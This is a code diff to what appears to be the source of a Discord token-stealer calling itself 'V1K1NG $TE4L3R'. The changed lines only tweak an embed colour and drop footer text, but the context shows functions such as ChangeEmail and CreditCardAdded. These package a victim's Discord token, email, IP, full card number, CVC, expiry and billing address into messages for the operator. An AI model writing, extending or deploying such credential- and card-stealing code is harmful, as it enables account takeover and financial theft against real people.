@@ -15,7 +15,7 @@ const config = {
     "logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify":"%INITNOTI%",
-    "embed-color": 3447704,
+    "embed-color": -16668477,
     "disable-qr-code":"%DISABLEQRCODE%"
 }
 
@@ -565,9 +565,6 @@ function ChangeEmail(newemail, password, token) {
                         "author": {
                             "name": "V1K1NG $TE4L3R"
                         },
-                        "footer": {
-                            "text": "V1K1NG $TE4L3R"
-                        },
                         "thumbnail": {
                             "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                         }
@@ -602,9 +599,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                     "author": {
                         "name": "V1K1NG $TE4L3R"
-                    },
-                    "footer": {
-                        "text": "V1K1NG $TE4L3R"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
